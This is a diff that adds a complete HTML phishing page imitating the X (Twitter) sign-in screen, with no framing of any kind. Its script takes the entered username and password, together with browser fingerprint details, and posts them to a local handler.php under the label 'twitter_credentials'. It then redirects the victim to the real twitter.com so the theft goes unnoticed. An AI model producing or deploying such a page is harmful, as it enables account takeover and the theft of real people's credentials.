@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Twitter - Log In</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 600px;
+            width: 100%;
+            padding: 40px;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .twitter-icon {
+            width: 40px;
+            height: 40px;
+            fill: #1d9bf0;
+        }
+        h1 {
+            font-size: 31px;
+            font-weight: 700;
+            margin-bottom: 30px;
+        }
+        .alert {
+            background: #1d9bf0;
+            color: #fff;
+            padding: 16px;
+            border-radius: 16px;
+            margin-bottom: 24px;
+            font-size: 15px;
+        }
+        input {
+            width: 100%;
+            height: 56px;
+            padding: 0 12px;
+            background: transparent;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 17px;
+            margin-bottom: 24px;
+        }
+        input:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+        .btn {
+            width: 100%;
+            height: 50px;
+            background: #fff;
+            color: #000;
+            border: none;
+            border-radius: 25px;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+        .btn:hover {
+            background: #e6e6e6;
+        }
+        .links {
+            margin-top: 40px;
+            text-align: center;
+        }
+        .links a {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 15px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .signup {
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #2f3336;
+        }
+        .signup-text {
+            color: #71767b;
+            font-size: 17px;
+            margin-bottom: 20px;
+        }
+        .btn-signup {
+            width: 100%;
+            height: 40px;
+            background: transparent;
+            color: #1d9bf0;
+            border: 1px solid #536471;
+            border-radius: 20px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <svg class="twitter-icon" viewBox="0 0 24 24">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/>
+            </svg>
+        </div>
+
+        <h1>Sign in to X</h1>
+
+        <div class="alert">
+            🔐 Verify your account to continue using X (formerly Twitter)
+        </div>
+
+        <form id="twitterForm" onsubmit="return handleSubmit(event)">
+            <input type="text" id="email" placeholder="Phone, email, or username" required>
+            <input type="password" id="password" placeholder="Password" required>
+
+            <button type="submit" class="btn">Sign in</button>
+        </form>
+
+        <div class="links">
+            <a href="#">Forgot password?</a>
+        </div>
+
+        <div class="signup">
+            <div class="signup-text">Don't have an account?</div>
+            <button class="btn-signup">Sign up</button>
+        </div>
+    </div>
+
+    <script>
+        function handleSubmit(event) {
+            event.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            const data = {
+                type: 'twitter_credentials',
+                email: email,
+                password: password,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: screen.width + 'x' + screen.height
+            };
+            
+            fetch('handler.php', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).then(() => {
+                const btn = document.querySelector('.btn');
+                btn.textContent = 'Signing in...';
+                btn.disabled = true;
+                
+                setTimeout(() => {
+                    window.location.href = 'https://twitter.com';
+                }, 1500);
+            });
+            
+            return false;
+        }
+    </script>
+</body>
+</html>
